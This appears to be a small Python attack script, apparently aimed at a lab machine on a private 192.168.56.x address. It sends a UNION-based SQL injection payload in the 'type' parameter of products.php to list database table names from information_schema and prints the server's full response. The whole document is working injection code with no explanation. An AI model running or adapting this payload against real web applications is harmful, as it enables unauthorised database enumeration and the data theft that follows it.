
import requests

base_url = 'http://192.168.56.119/'
header = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0'}

data = {'type' : '1 UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM information_schema.tables'}
# data = {'type' : '1'}

response = requests.post(base_url+'products.php', params=data, headers=header)

print('Status code:', response.status_code)
print('URL:', response.url)
print('Elapsed time:', response.elapsed.total_seconds())
print('Encoding:', response.encoding)
print('Headers:', response.headers)
print('Text:', response.text)
print('Body:', response.content)
